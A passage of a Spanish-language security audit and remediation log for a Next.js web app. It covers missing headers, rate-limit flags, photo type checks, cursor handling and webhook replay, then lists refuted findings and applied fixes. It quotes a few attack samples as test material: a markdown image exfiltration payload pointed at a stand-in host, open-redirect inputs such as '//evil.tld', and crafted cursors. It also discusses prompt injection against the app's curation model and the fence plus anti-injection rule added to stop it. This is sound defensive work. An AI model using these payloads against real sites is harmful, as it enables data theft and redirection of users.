| Techo «prometido» (0,021/mensaje medido) | **~US$10,50/mes** |
| Presupuesto declarado (`DEPLOY.md:51`) | **≤ US$20/mes** |
| Peor caso teórico (0,192/turno) | **~US$96/mes** |
| Adversarial realista (2-3 rondas) | ~US$38/mes |

**Lo que se sostiene:** que *«la app no puede gastar más de US$20/mes»* es falso — el peor caso lo
quintuplica. **Lo que no:** el ángulo del `cache_control` es un callejón sin salida. El prefijo de
8.776 tokens supera 8× el mínimo de Sonnet 5, y el caching está **medido funcionando en producción**
(67.550 de lectura contra 7.536 de entrada).

**Atenuante honesto:** forzar 5 rondas con output máximo en cada una no es trivial (el mensaje está
topeado a 1.000 caracteres y el prompt desalienta re-buscar). El peor caso es **una cota, no lo
esperable**.

**Fix.** Barato (15 min): bajar `MAX_RONDAS_TOOL` a 3. Correcto (1 h): contar tokens en un SKU
`chat_tokens` de `ai_api_usage` —los tokens ya se acumulan y se persisten— y chequearlo en
`reservarCupo`. Es el mismo patrón que ya usan los topes de Google.

**Bug adyacente, gratis:** si la ronda 5 devuelve `tool_use`, se ejecutan las tools, se paga y se
tira el resultado; el texto puede quedar cortado.

---

### `SEC-11` · Cero headers de seguridad

**Dónde:** `next.config.ts` (10 líneas, solo `allowedDevOrigins`); sin `middleware.ts`.

Confirmado en vivo contra dev: la app no emite CSP, `X-Frame-Options`, HSTS propio,
`X-Content-Type-Options`, `Referrer-Policy` ni `Permissions-Policy`. Como `next.config.ts` no define
`headers()`, en producción es igual.

**Es UN hallazgo, no seis, y con jerarquía:**

1. **CSP — el único que mueve la aguja.** Es lo que habría contenido a `SEC-04` y lo que cortaría la
   exfiltración por markdown del chat (`![](https://malo/?d=…)` renderiza un `<img>` que carga solo).
   **Cuesta**: MapLibre usa Web Workers y `blob:`. Arrancar en `Report-Only`.
2. **`Referrer-Policy` — el de mejor retorno.** Una línea, riesgo cero. Hay **dos superficies con
   token en la URL** (`/votacion/[token]` y el `?token=` de `/restablecer`) que linkean a dominios
   externos: un `Referer` con el path completo filtra el token de reset.
3. **`X-Frame-Options` — menos grave de lo que parece.** La cookie de sesión es `sameSite: lax`, y
   las cookies Lax **no viajan en la carga de un iframe cross-site**: el iframe renderiza
   deslogueado, así que **el clickjacking no funciona hoy**. Ponerlo igual (`DENY`) es una línea y
   protege del día que alguien toque el `sameSite`.
4. **`nosniff` y `Permissions-Policy`:** marginales acá. Higiene, no tapón.

**Pendiente de verificar en línea (read-only, lo pido antes de hacerlo):** qué agrega Vercel por su
cuenta —sobre todo si emite HSTS en el dominio custom— y los atributos reales de la cookie de sesión
en producción.

---

### `SEC-12` · `DISABLE_RATE_LIMIT` no mira `NODE_ENV`, y el `.env.example` lo trae en `true`

**Dónde:** [`lib/middleware/rate-limit.ts:157-159`](../../lib/middleware/rate-limit.ts#L157-L159) · `.env.example`.

`deshabilitado()` es `process.env.DISABLE_RATE_LIMIT === 'true'`, sin mirar el entorno. Apaga
**todos** los cupos en cualquier lado. Y el archivo que uno copia para armar un entorno lo trae
seteado en `true`. `DEPLOY.md:79` dice «jamás en prod», pero eso es una promesa en un doc, no un
guard en el código: un `vercel env pull`/`push` distraído lo prende.

**Fix (2 líneas):** que `deshabilitado()` devuelva `false` si `NODE_ENV === 'production'`, y dejar la
variable **comentada** en `.env.example`. Es la verificación **V-2**.

---

### `SEC-13` · El tipo de las fotos se cree, nunca se comprueba

**Dónde:** [`app/api/mi-negocio/[placeId]/photos/route.ts:62-71`](../../app/api/mi-negocio/[placeId]/photos/route.ts#L62-L71) · [`lib/storage/r2.ts:118`](../../lib/storage/r2.ts#L118).

La única validación de tipo es `esTipoPermitido(archivo.type)`, y `archivo.type` es el
`Content-Type` de la parte multipart, puesto por el cliente. Los magic bytes **nunca se miran**,
aunque los bytes ya están en memoria. El comentario del handler dice *«tipo y tamaño se chequean
sobre los bytes leídos»* — **es cierto del tamaño y falso del tipo**.

**No es XSS:** la allowlist de 3 tipos impide almacenar `text/html` o SVG, y con
`Content-Type: image/jpeg` ningún browser interpreta HTML. El impacto es **abuso de hosting**: un
dueño aprobado distribuye archivos arbitrarios desde la infraestructura de Fer, con caché de un año,
y el remedio (`npm run fotos:borrar`) es manual y por lugar.

**Precondición alta y real:** requiere reclamo **aprobado por un humano** sobre ese lugar. No lo hace
un anónimo ni un logueado cualquiera.

**Fix (~15 líneas, sin dependencias):** derivar el tipo de la firma real en vez de creerle al
cliente. El dueño natural es `lib/storage/r2.ts`, al lado de `esTipoPermitido`.

**Sube de severidad si V-3 dice que `R2_PUBLIC_URL` es un subdominio de `adondesalimos.com.ar`**
(mismo eTLD+1 ⇒ alcance de cookies). Recomendación barata en cualquier caso: servir R2 desde un
dominio sin relación con el de la app.

**Nota operativa aparte:** `MAX_BYTES = 5 MB` es **mayor** que el techo de body de una función
serverless de Vercel (~4,5 MB), así que una foto de entre 4,5 y 5 MB que la app dice aceptar rebota
con un error genérico de plataforma, no con el 413 propio.

---

### `SEC-14` · Cursor manipulado devuelve 500 en vez de degradar — **reproducido en vivo**

**Dónde:** [`lib/search/query.ts:120-127`](../../lib/search/query.ts#L120-L127) (`decodeCursor`).

`decodeCursor` hace `JSON.parse` y solo chequea `typeof parsed === 'object'`, sin validar los tipos
de los valores. Esos valores van como parámetros —**no hay inyección**— pero con el tipo equivocado
para la columna.

**Reproducido** contra dev:

| Cursor manipulado | Resultado |
|---|---|
| `{"s":1,"o":"abc",…}` (string donde va entero) | **HTTP 500** |
| `{"s":1,"o":[1,2],…}` (array) | **HTTP 500** |
| `{…,"n":{"a":1}}` | 200, degrada bien |
| `{…,"i":"no-es-uuid"}` | 200, degrada bien |

Solo se dispara con búsqueda activa (sin parámetros no entra al keyset).

**Impacto.** Bajo: ruido de logs y una promesa de UX incumplida (el comentario del código dice
*«Cursor manoseado en la URL: se ignora y se sirve la primera página»*). El detalle del error no se
filtra. **El contraste está en el mismo repo:** `decodeCursorHistorial`
(`lib/votaciones/query.ts:366-375`) **sí** valida los tipos.

**Fix (10 min):** validar que cada valor sea `string|number` y devolver `null` si no. O reusar el
patrón del historial.

---

### `SEC-15` a `SEC-25` · El resto

- **`SEC-15` · TOCTOU del tope de Google.** `contarUso` (SELECT) e `incrementarUso` (upsert) son dos
  viajes sin transacción: N requests concurrentes leen el mismo valor bajo el cap y pasan todas. El
  overshoot es de pocos dólares, pero **el fix es copiar el patrón de tres líneas que ya está escrito
  en `lib/ai/cupo.ts`**, que para el chat sí usa `FOR UPDATE`. La regla existe en la casa y no se
  aplicó acá. Corolario: los US$108 de `SEC-02` son un piso del techo, no el techo exacto.
- **`SEC-16` · `MAX_BUCKETS` no es un tope.** `podar()` solo borra buckets **vencidos**; con prefijos
  de ventana larga (`claims` = 24 h) no hay nada que borrar, el `Map` crece más allá de los 10.000 y
  **cada key nueva dispara un barrido completo**. Depende de que se puedan generar keys falsas, o sea
  de `SEC-03`. Lo resuelve Upstash (`DEPLOY` F2).
- **`SEC-17` · `maxDuration` en una sola ruta.** Solo `app/api/chat/route.ts:32` lo declara; el resto
  queda en el default de 300 s. Una request lenta retiene su slot de función y su turno en la
  conexión. **Fix: `export const maxDuration = 15` en las rutas de lectura.** Cinco líneas, riesgo
  cero.
- **`SEC-18` · Replay del webhook de MP.** La firma se valida bien (HMAC + `timingSafeEqual` +
  fail-closed sin secret) pero **el `ts` nunca se compara contra el reloj**: una firma legítima
  capturada vale para siempre. Impacto bajo porque reprocesar es idempotente (UNIQUE +
  `FOR UPDATE`). **Fix: 3 líneas.** Hoy inerte (el cobro está apagado); conviene hacerlo **antes** de
  encender F3, no después. Adjunto: el `type`/`data.id` caen al body cuando falta el query, y el
  manifest solo cubre el query — 2 líneas, confianza media (no verifiqué si MP emite notificaciones
  sin `data.id`).
- **`SEC-19` · `payer_email` del body sin validar** contra la sesión
  (`app/api/billing/checkout/route.ts:41`). Se manda a MP como pagador y se persiste. **No es un
  vector de plan** (el flag se acredita por `session.user.id`), y hoy la columna **se escribe y nunca
  se lee**. El riesgo es a futuro, cuando algo la lea como verdad. **Fix: 1 línea** — usar
  `session.user.email`.
- **`SEC-20` · SSRF en el crawler de curaduría.** `lib/curation/fetch-sitio.ts:61` hace
  `redirect: 'follow'` sin allowlist de host/IP. **Convergieron dos agentes independientes en esto**,
  y los dos coinciden en que **no es alcanzable desde ninguna ruta HTTP** (los filtros de selección
  son mutuamente excluyentes) y en que el script corre en la máquina de Fer, no en Vercel. Es
  preventivo: el día que la curaduría sea un cron en Vercel, la cadena se cierra sola. **Fix:
  `redirect: 'manual'` + rechazar rangos privados, ~20 líneas.** Aparte y de 1 línea: alinear
  `lib/claims/validacion.ts:51` con `lib/negocio/validacion.ts:32-35`, que para **la misma columna
  resuelta** ya exige `http(s)`. Es una segunda validación de la misma regla que driftó.
- **`SEC-21` · Emails sin normalizar.** `frodriguez+1@gmail.com` … `+999@` son 999 usuarios
  distintos verificables desde una sola bandeja, con 3 mensajes de trial cada uno. La blocklist de
  desechables tiene 23 dominios y compara por igualdad. **Fix: normalizar el local-part de Gmail
  antes del alta, ~20 min.**
- **`SEC-22` · `GET /api/votaciones/[token]` sin cupo.** Es el único endpoint público que consulta la
  base sin pasar por el rate-limit; cada hit son 5 queries y está pensado para polling. Suma a
  `SEC-01`. **Fix: 2 líneas.**
- **`SEC-23` · Las 9 rutas `/api/admin/*` devuelven 403; las páginas, 404.** El 403 confirma que la
  ruta existe. **No hay bypass**: `emailEsAdmin` devuelve `false` si `ADMIN_EMAIL` está vacío, o sea
  que la falta de configuración **cierra** el panel, no lo abre. Cosmético; 9 líneas si se quiere.
- **`SEC-24` · `ilike` sin escapar `%`/`_`** en el buscador de usuarios de `/admin`
  (`lib/billing/admin.ts:91`). Requiere admin, que ya puede listar todo. Impacto ~nulo; se anota por
  completitud. 5 min.
- **`SEC-25` · Retención de `chat_messages`.** El prompt del usuario se guarda literal y los primeros
  60 caracteres se copian al título de la conversación. **No hay TTL ni job de retención.** No es una
  vulnerabilidad: es deuda de política de datos. Lo que sí importa está bien — **el contenido de los
  mensajes no se loguea**.

---

## Refutados — hallazgos que no sobrevivieron

Esta sección vale tanto como la anterior: son cosas que **parecían** vulnerabilidades y no lo son.
Anotarlas evita que la próxima auditoría las re-descubra.

| Afirmación | Por qué se cae |
|---|---|
| **XSS vía `callbackUrl=javascript:`** | Probado en vivo: **no ejecuta**. Chrome bloquea `location.assign('javascript:')`. `SEC-04` es open redirect, no XSS |
| **XSS almacenado por el `website` del dueño en un `<a href>`** | React 19.2 sanitiza `javascript:` en `href` **también en producción** (verificado en el dist de `react-dom`) |
| **XSS por la salida del modelo en el chat** | `react-markdown` v10 sin `rehype-raw`, y su `defaultUrlTransform` recorta a protocolos seguros |
| **Prompt injection vía `description`/`news` del dueño** | **La premisa del brief era incorrecta:** `searchPlaces` nunca joinea `place_owner_content`, así que ese texto **no llega al modelo**. El vector real es otro (`SEC-07`) |
| **Bypass de la visibilidad del catálogo por la tool del chat** | `publishedWhere` es la **primera línea, incondicional**, de `construirWhere`. No hay segundo camino |
| **Se puede conseguir premium sin pagar** | No. HMAC fail-closed, re-consulta a MP con el `data.id`, y el usuario sale de la fila propia creada con `session.user.id` |
| **Inyección SQL (primer o segundo orden)** | Cero. `clavesDeOrden` son literales del código; los 3 `sql.raw` tienen dominio cerrado por tipo; `app_settings` nunca llega a posición de identificador |
| **IDOR en las rutas con `[id]`/`[placeId]`/`[userId]`** | Cero en 36 handlers. El `WHERE` lleva el `userId`, no solo un chequeo previo |
| **Tokens de votación adivinables** | 16 bytes de `crypto.getRandomValues` = 128 bits reales. Cero `Math.random` |
| **Spamear a un tercero con sign-up** | A un email ya registrado **no le manda nada** (respuesta duplicada genérica). El vector real es `send-verification-email` (`SEC-05`) |
| **`/api/search` permite pedir 10.000 filas / `pins` devuelve todo el catálogo** | Probado en vivo: `limit=100000` devuelve 20; `pins` corta en 200 con flag `truncated` |
| **Clickjacking sobre acciones autenticadas** | La cookie `sameSite: lax` no viaja en un iframe cross-site: renderiza deslogueado |
| **CSRF explotable** | No hoy. `sameSite: lax` lo cubre. Queda la fragilidad de que la protección vive en un default de `node_modules` y no en el código |
| **Host header injection en los links de mail** | Las URLs salen de `BETTER_AUTH_URL` (env), nunca del header `Host` |
| **`undici` (cross-user information disclosure) en el runtime** | Cuelga de `shadcn`, que no se importa nunca. Nunca estuvo en el runtime (`SEC-09`) |
| **SSRF por el optimizador de imágenes de Next** | `next/image` **no se usa** en el proyecto. La ausencia del bloque `images` es correcta |
| **Parameter injection hacia Google que cambie el SKU** | El field mask viaja en **header**, no en query, y el `place_id` va con `encodeURIComponent` |
| **El `cache_control` del chat no cachea** | Falso: 8.776 tokens superan 8× el mínimo de Sonnet 5, y está medido funcionando en prod |
| **Secretos en el bundle del cliente** | Verificado empíricamente contra los 40 chunks: las 16 variables server-only no aparecen. Solo está la `NEXT_PUBLIC_` correcta |

---

## Lo que está bien — para no re-auditarlo

Varias de estas son decisiones deliberadas y bien comentadas, no accidentes:

- **Los gates de autorización.** `esDuenoDe` exige claim `approved` para *ese* par (usuario, lugar) y
  corre **antes** de parsear el body. `verificarDueno`, `listasVisibles`, `cargarPropia` y el
  `and(fotoId, placeId)` del borrado están todos scoped. Ningún handler confía en un id del body.
- **Un dueño único por regla, y se sostiene.** Los flags `users.plan` / `places.owner_plan` tienen
  **cuatro** escrituras y las cuatro están en `lib/billing/subscriptions.ts`. **La segunda escritura
  que el QA de ADMIN_USUARIOS había destapado en `baja.ts` está unificada.**
- **El cupo del chat es TOCTOU-safe de verdad** (`FOR UPDATE` + `onConflictDoNothing`, reserva
  **antes** de llamar), y el contador global no se revierte a propósito. Es el módulo mejor blindado
  de los que se leyeron.
- **El grounding del chat es un candado estructural**, no una instrucción: un id que la tool no
  devolvió se descarta aunque el modelo insista.
- **`owner_plan` no participa del chat** en ningún punto — ni prompt, ni tool, ni cupo. Un dueño pago
  no compra lugar en las recomendaciones de la IA, y la ausencia está documentada como decisión.
- **R2 bien cerrado:** key generada con `crypto.randomUUID()` del server (path traversal imposible),
  cupo verificado dentro de una transacción con `FOR UPDATE`, fila insertada después del PUT, objeto
  huérfano borrado al perder la carrera, y cero credenciales o URLs firmadas al cliente.
- **El tope de Google degrada de verdad**, no solo cuenta: corta antes del `fetch` y devuelve la
  ficha sin bloque de Google.
- **La validación en el borde de la búsqueda:** slugs contra `/^[a-z0-9-]{1,60}$/`, coordenadas con
  `Number.isFinite` y rango, `q` topeado a 100 caracteres.
- **Logs sin PII:** ~60 `console.*` revisados; loguean ids y errores, nunca email, contraseña, token,
  IP ni el body de un request. El webhook de MP tampoco loguea el payload.
- **Los `catch` de los 35 route handlers** devuelven mensajes fijos con `code`; ninguno reenvía stack
  ni texto de Postgres.
- **`.gitignore`** cubre `.env`, `backups/`, `.mcp.json` y `docs/qa/*.local.md`, y `git ls-files`
  confirma que nada de eso está trackeado. **`.env` nunca se commiteó en toda la historia del repo.**
- **`lib/billing/__tests__/secrets.test.ts`** recorre el árbol y falla si los secretos de MP aparecen
  fuera de su módulo. Es la mejor pieza de defensa del repo en esta dimensión; **solo le falta
  cobertura** (extenderla a las demás variables es un fix de costo casi cero).
- **El pendiente de guardado** cumple la asimetría documentada: `sessionStorage` guarda solo, pero el
  `?guardar=` del mail valida UUID, limpia la URL y **exige un toque**. Un link ajeno no puede
  escribir en la lista de nadie.

---

## Fixes aplicados en la primera sesión (2026-08-18)

Fer eligió **solo los de una línea**: lo anónimo y barato, sin abrir ningún frente. Gate:
**typecheck limpio + 793 tests en verde**. El `build` quedó pendiente porque el dev server estaba
levantado y comparten `.next`; **corrió verde al cerrar la segunda sesión**, sobre el mismo working tree.

| ID | Qué se cambió | Archivo | Verificación |
|---|---|---|---|
| `SEC-02` | El cupo de `ficha-google` pasa de heredar 60/min a tener el suyo: **10/min** | [`lib/middleware/rate-limit.ts`](../../lib/middleware/rate-limit.ts) | Código + tests. Agotar la cuota de Google pasa de ~83 minutos a **~8 horas** |
| `SEC-04` | `callbackUrl` se normaliza a ruta interna antes de tocar `location.assign()` | [`lib/navegacion/destino.ts`](../../lib/navegacion/destino.ts) (nuevo, con test) + `login` y `registro` | ✅ **Re-verificado en vivo**: el mismo request que antes depositaba al usuario en `example.com` ahora aterriza en la home |
| `SEC-12` | `deshabilitado()` devuelve `false` en producción; la variable queda **comentada** en `.env.example` | [`lib/middleware/rate-limit.ts`](../../lib/middleware/rate-limit.ts) + `.env.example` | Código + tests |
| `SEC-01` *(parcial)* | `getConfidenceThreshold` pasa a `React.cache`, el patrón que ya usaban `getCadenas` y `getPlaceDetail` | [`lib/db/settings.ts`](../../lib/db/settings.ts) | ✅ **Los conteos no se movieron** (`q=cafe` → 20 places, 200 pins con `truncated`, count 992, home 200) |

**Sobre `SEC-04`, decisión de diseño:** el fix vive en `lib/navegacion/destino.ts` como **dueño
único** de la pregunta *«¿este destino es nuestro?»*, en vez de repetir el condicional en las dos
pantallas. Es el criterio de § *Una regla, un dueño* del `CLAUDE.md`: `volver.ts` ya era dueño de
*«¿back o subo?»* y esta pregunta no tenía dueño. El test cubre los casos que se olvidan
—`//evil.tld` y `/\evil.tld` (protocol-relative con barra y con backslash)—, no solo el `https://`
obvio.

**Honestidad sobre `SEC-01`:** la reducción de sentencias (59 → ~42) **no se re-midió**. El
mecanismo está verificado por precedente en el mismo repo (`getCadenas` hace exactamente esto) y por
el invariante que sí comprobé: ningún conteo cambió. Re-medir con el log de sentencias es trabajo de
la próxima sesión, junto con la parte estructural, que es la que de verdad cierra `SEC-01`
(`middleware.ts` + los 18 `count(*)`).

**Lo que NO se tocó, a propósito:** `SEC-08` (el `.env.example` con la contraseña real) quedó fuera
porque el fix útil no es vaciar el valor —eso da falsa tranquilidad— sino **rotar la contraseña del
rol de Postgres**, y esa es una decisión de Fer, no un cambio de una línea.

### `SEC-08` — riesgo ACEPTADO por Fer (2026-08-18)

**Decisión:** no se rota la contraseña ni se vacía el valor. **Motivo:** la base de dev corre en un
ambiente privado y seguro, escuchando solo en `localhost`, así que el vector de red no existe.

**Queda anotado en vez de arreglado, y con la condición que lo reabre**: el riesgo remanente no es
de red, es de **distribución del repo**. La credencial está en un archivo versionado y **también en
el historial de git**, así que la decisión hay que revisarla si alguna vez el repo se hace público,
se forkea, se espeja, se sube a un CI de terceros o se comparte con alguien más. Mientras el repo
sea privado y la base local, la aceptación es razonable.

**Si algún día se reabre:** vaciar el valor en `.env.example` es lo de menos; lo que resuelve es
rotar la contraseña del rol de Postgres. Limpiar el historial solo hace falta si la base deja de ser
local.

---

## Fixes aplicados en la segunda sesión (2026-08-18) — `SEC-05`, `SEC-06`, `SEC-07`

Los tres de la cola de la sesión anterior. Gate completo: **typecheck limpio + 819 tests en verde**
(793 de base + 26 nuevos) **+ `build` verde con el dev server parado** — que cubre también los 4 fixes
de la primera sesión, que habían quedado con el build pendiente.

Antes de la migración de `SEC-05` se corrió `npm run backup:db` →
`backups/adondesalimos_2026-08-18_141642.sql.gz`.

| ID | Qué se cambió | Archivos | Verificación |
|---|---|---|---|
| `SEC-05` (a) | El envío de la verificación deja de ser silencioso: si no sale, **la pantalla lo dice** | [`lib/auth/index.ts`](../../lib/auth/index.ts), [`lib/email/index.ts`](../../lib/email/index.ts), `app/(auth)/registro/page.tsx` | ✅ **En vivo**: el alta que antes mostraba *«Revisá tu mail»* ahora muestra *«Creamos tu cuenta, pero el mail no salió»* con el motivo exacto |
| `SEC-05` (b) | UI de reenvío, que no existía en ninguna parte de la app | [`components/auth/reenviar-verificacion.tsx`](../../components/auth/reenviar-verificacion.tsx) (nuevo) + `registro` y `login` | ✅ **En vivo** en los dos puntos de entrada: la pantalla de alta y el login con `EMAIL_NOT_VERIFIED` |
| `SEC-05` (c) | Cupo de mails: tope global del mes con kill switch + tope por destinatario y día | [`lib/email/cupo.ts`](../../lib/email/cupo.ts) (nuevo), `lib/db/schema.ts`, `drizzle/0019_cupo_mails.sql`, `scripts/seed.ts` | 8 tests de integración, incluido uno de **concurrencia** (8 reenvíos simultáneos → pasan 3) |
| `SEC-06` | El revert del cupo pasa a ser **condicional**: solo si Anthropic nunca llegó a contestar. Y cortar el stream **aborta** la llamada | [`lib/ai/chat.ts`](../../lib/ai/chat.ts) | 3 tests que fijan el límite en los dos sentidos, con el cliente de Anthropic mockeado (cero llamadas reales) |
| `SEC-07` | La cita se coteja contra el texto scrapeado antes de auto-aplicar; fence + regla anti-inyección; tope de 4 auto-aplicados por lugar y corrida | [`lib/curation/evidencia.ts`](../../lib/curation/evidencia.ts) (nuevo), `suggestions.ts`, `sugeridor.ts`, `scripts/curar.ts` | 12 unitarios puros + 3 de integración. Ningún modelo involucrado |

### `SEC-05` — el plan del informe no se podía aplicar tal cual

El informe pedía *«propagar el error del envío al cliente»* desde el callback de
`emailVerification.sendVerificationEmail`. **Por ahí no se puede**: el sign-up de better-auth invoca
ese callback dentro de `runInBackgroundOrAwait`, que tiene su propio `catch` y solo loguea
(`node_modules/better-auth/dist/context/create-context.mjs:214-224`). Rethrowear no cambia nada: el
alta sigue devolviendo **200**.

Lo que sí propaga es el endpoint `/send-verification-email` (`if (error) throw error`). Así que
`sendOnSignUp` pasó a **`false`** y el mail lo pide la pantalla de registro apenas el alta vuelve OK.
Queda **un solo camino de envío** —el mismo que usa el botón de reenvío— y la pantalla puede decir la
verdad. El costo es un request más en el alta; si ese request se pierde, el usuario tiene el botón,
que es justamente lo que antes no existía.

**Dónde vive la regla nueva:** `lib/email/cupo.ts` es el **dueño único** de *«¿podemos mandar este
mail?»*, y todos los mails salen por un solo embudo (`enviar`, en `lib/email/index.ts`). Antes las
cuatro funciones repetían el `resend.emails.send` + el chequeo de error, o sea que el cupo habría
tenido cuatro puntos de aplicación y cuatro lugares donde olvidarlo.

**Dos decisiones de diseño que conviene no revertir sin leer el porqué:**

- **El tope por destinatario es por SKU**, no por dirección a secas. Que un reenvío de verificación
  se coma el presupuesto de un reset de contraseña sería peor que el abuso que evita: el que pide un
  reset porque no puede entrar es justo el que no tiene otro camino. El abuso que importa —repetir
  *el mismo* mail— queda igual de acotado.
- **El destinatario se guarda hasheado** (SHA-256 del mail en minúsculas). La tabla necesita contar,
  no saber a quién; y como la escribe un endpoint **anónimo** con la dirección que le pasen, en claro
  se volvería una lista enumerable de las direcciones que alguien probó.

**El tope global se mide contra la SUMA del mes**, no contra el contador de un SKU: la cuota del plan
de Resend es una sola y compartida. El default nace en **2.500**, por debajo de los ~3.000 que
`DEPLOY.md:50` anota — para que el gate avise antes de que el proveedor empiece a rechazar. ⚠️ Ese
3.000 **sigue sin verificar en la consola de Resend**; cuando se confirme, es un `UPDATE`.

**Hallazgo del QA en vivo (no estaba en el informe):** con una sesión abierta de **otra** cuenta,
`/send-verification-email` devuelve `EMAIL_MISMATCH` y el botón de reenvío quedaba mudo. Pasa si
alguien crea una segunda cuenta sin salir de la primera (compu compartida). Se cerró con copy
accionable en `lib/auth/errorMessages.ts` — *«Tenés otra cuenta abierta en este navegador. Cerrá
sesión y volvé a pedir el link»*.

**Lo que NO se verificó en vivo, y por qué:** que un mail **llegue de verdad**. Todo el QA se hizo
con el kill switch (`email.monthly_cap = 0`), que corta en el gate **antes** de llamar a Resend, así
que no salió ni un mail y no se gastó cuota. Eso deja probado el camino de la falla, que es el que
`SEC-05` denunciaba; el camino feliz del envío es el mismo `resend.emails.send` que ya funcionaba,
solo movido de lugar. Confirmar una entrega real necesita una dirección de Fer y un tope > 0.
`email.monthly_cap` quedó restaurado en 2.500 y los tres usuarios de prueba, borrados.

**Sobre `(c)` y el pre-hijacking:** el informe decía que `(c)` mitiga `(b)` y `(c)`. Es cierto para el
mailbombing. El **pre-hijacking sigue siendo posible** —un atacante puede crear la cuenta con la
dirección de otro y una contraseña propia— y hoy lo único que lo frena es el copy del mail. Cerrarlo
del todo pide otra cosa (invalidar la contraseña previa al verificar, o verificar antes de crear), y
eso no estaba en el alcance de esta sesión.

### `SEC-06` — dónde falla decide si el cupo vuelve

`llamadaEmitida` se marca en el primer `finalMessage()` y el revert quedó condicional a
`!llamadaEmitida`. Además:

- **`emitir()` reemplaza a los 6 `controller.enqueue`**: escribirle a un stream ya cerrado era
  precisamente la excepción que hacía pasar una desconexión por *«falló el turno»*, y también la que
  dejaba una unhandled rejection al intentar emitir el evento de error.
- **`cancel()` aborta la llamada a Anthropic** con un `AbortSignal`. Antes no había handler y la
  respuesta se seguía generando entera para nadie.

**Los dos colaterales que anotaba el informe quedan cerrados por el propio fix**: el mensaje del
assistant se inserta dentro del `try`, así que la conversación *«con respuesta sin pregunta»* solo
podía darse revirtiendo después de haber contestado — y ahora en ese tramo no se revierte.

**El resto que queda, a propósito:** si el cliente corta **en la mitad de la primera ronda**, todavía
se revierte. Ahí lo facturado es una fracción y `cancel` ya abortó la generación, así que el resto es
chico y acotado. El límite está donde el informe lo puso.

### `SEC-07` — qué mata y qué no

`citaVerificable` (dueño único de la regla) exige que la cita esté **literalmente** en el texto
scrapeado, normalizando espacios y mayúsculas, con un piso de 10 caracteres. Lo que no se puede
verificar **no se descarta**: va a la cola manual.

**Honestidad sobre el alcance:** el informe dice que este fix *«mata el vector»*. Mata el camino de
la **cita fabricada** —el modelo ya no puede respaldar un tag con algo que no leyó—, pero no vuelve
dócil al modelo: un dueño todavía puede **escribir la afirmación en su página** y hacerla citable.
Lo que cambia es que eso deja de ser inyección de prompt y pasa a ser *mentir en el sitio propio, en
texto visible* — auditable con `evidence` + `source_url`, y que es exactamente el input que el sistema
decidió creer. El **tope de 4 por lugar** acota lo que queda (en la corrida de julio un solo dominio
produjo 67 tags sobre 11 lugares).

**Detalle que hay que saber para no romperlo:** el fence `<evidencia_no_confiable>` es hermético
**porque `htmlATexto` borra todo lo que matchee `<[^>]+>`**, así que un `</evidencia_no_confiable>`
plantado en la página se va con los demás tags. Esa garantía está testeada donde vive, en
`lib/curation/__tests__/evidencia.test.ts`.

**Sobre el caching del prompt:** la regla anti-inyección **suma** texto al system del sugeridor, que
estaba en 1.260 tokens contra un mínimo de 1.024. Crecer es seguro (el riesgo del mínimo es achicar),
así que no hizo falta re-medir con `count_tokens`. Con Haiku sigue sin cachear, como ya estaba
anotado.

**El reporte de `npm run curar` ahora cuenta lo frenado** (`sin cita real` / `pasadas del tope`) y
avisa si hubo citas que no aparecen en la evidencia: un tope que recorta en silencio se lee como
*«entró todo»*.

---

## Fixes aplicados en la tercera sesión (2026-08-18) — la cola larga

Diez hallazgos: los siete del lote barato más `SEC-13`, `SEC-18` y `SEC-21`, que Fer aprobó al
principio de la sesión. Gate completo: **typecheck limpio + 837 tests en verde** (819 de base + 18
nuevos) **+ `build` verde con el dev server parado**. Ninguna migración, así que no hizo falta
backup. `SEC-09` va **en un commit aparte** por tocar dependencias.

| ID | Qué se cambió | Archivos | Verificación |
|---|---|---|---|
| `SEC-14` | El cursor se valida **contra el tipo de cada clave del orden**, no solo contra la forma | [`lib/search/query.ts`](../../lib/search/query.ts) | Los dos cursores que daban 500 (`"o":"abc"` y `"o":[1,2]`) ahora caen a la primera página |
| `SEC-15` | `contarUso` + `incrementarUso` se colapsan en **una** reserva atómica, con el patrón de `lib/ai/cupo.ts` | [`lib/google/usage.ts`](../../lib/google/usage.ts), [`lib/lugar/enrichment.ts`](../../lib/lugar/enrichment.ts) | Test de **concurrencia** contra la base: 8 reservas simultáneas con tope 3 ⇒ pasan 3 |
| `SEC-17` | `export const maxDuration = 15` en las 10 rutas de lectura | `app/api/search/*`, `admin/*` (GET), `lugar/[id]/google`, `votaciones/[token]`, `votaciones/historial`, `chat/conversaciones` | Build verde; `/api/chat` (60) y el upload de fotos quedan intactos a propósito |
| `SEC-18` | El `ts` de la firma del webhook se compara contra el reloj: ventana de 5 min | [`lib/billing/mercadopago.ts`](../../lib/billing/mercadopago.ts) | 5 tests: una firma legítima capturada no sirve una hora después; ±4 min sí entran |
| `SEC-19` | El pagador sale de `session.user.email`, no del body | [`app/api/billing/checkout/route.ts`](../../app/api/billing/checkout/route.ts) | 1 línea |
| `SEC-20` (parcial) | El link del alta usa el **dueño único** de la regla en vez de su copia driftada | [`lib/negocio/validacion.ts`](../../lib/negocio/validacion.ts), [`lib/claims/validacion.ts`](../../lib/claims/validacion.ts) | El alta ahora exige `http(s)` para `website`, igual que el panel |
| `SEC-22` | Cupo propio para el polling de resultados: 120/min por IP | [`lib/middleware/rate-limit.ts`](../../lib/middleware/rate-limit.ts), `app/api/votaciones/[token]/route.ts` | El número sale de `POLL_MS = 4000` (15/min por pestaña) |
| `SEC-24` | `escaparLike` sobre el buscador de usuarios de `/admin` | [`lib/billing/admin.ts`](../../lib/billing/admin.ts) | Por completitud; el que escribe ya es admin |
| `SEC-13` | El tipo de una foto sale de **la firma de los bytes**, no del header del cliente | [`lib/storage/r2.ts`](../../lib/storage/r2.ts), `app/api/mi-negocio/[placeId]/photos/route.ts` | 5 tests: HTML/PHP/ELF/GIF/SVG disfrazados de jpeg dan `null`; un `.wav` no pasa por webp |
| `SEC-21` | Una bandeja de Gmail, una cuenta | [`lib/auth/canonico.ts`](../../lib/auth/canonico.ts) (nuevo), `app/api/auth/[...all]/route.ts` | 6 tests contra Postgres + verificación contra los datos reales de dev |

### `SEC-21` — la forma aprobada no se podía aplicar: **2 de los 3 usuarios de producción** quedaban afuera

El plan era *«normalizar el local-part de Gmail antes del alta, y también en el login»*. Antes de
escribirlo se midió quién quedaba afectado, y ahí se cayó:

```
PROD total usuarios: 3
PROD afectados: 2   →  frodriguez.este@gmail.com · sol.tripoliazcurra@gmail.com
```

Los dos tienen **un punto en el local-part**, que para Gmail es la misma bandeja que sin él. Canonizar
lo que se guarda —o canonizar el mail en el login— los dejaba **sin poder entrar a su propia cuenta**,
